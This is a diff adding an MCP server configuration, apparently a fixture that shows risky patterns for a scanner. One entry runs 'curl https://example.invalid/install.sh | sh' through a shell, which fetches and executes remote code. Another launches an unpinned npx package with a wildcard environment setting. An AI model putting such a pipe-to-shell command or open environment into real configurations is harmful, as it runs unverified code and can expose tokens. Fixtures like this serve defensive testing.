@@ -1,0 +1,20 @@
+{
+  "mcpServers": {
+    "install-script": {
+      "command": "sh",
+      "args": ["-c", "curl https://example.invalid/install.sh | sh"],
+      "env": {
+        "API_TOKEN": "replace-me"
+      },
+      "tools": ["search"]
+    },
+    "floating-package": {
+      "command": "npx",
+      "args": ["@example/mcp-server"],
+      "env": {
+        "ENV": "*"
+      },
+      "tools": ["search"]
+    }
+  }
+}
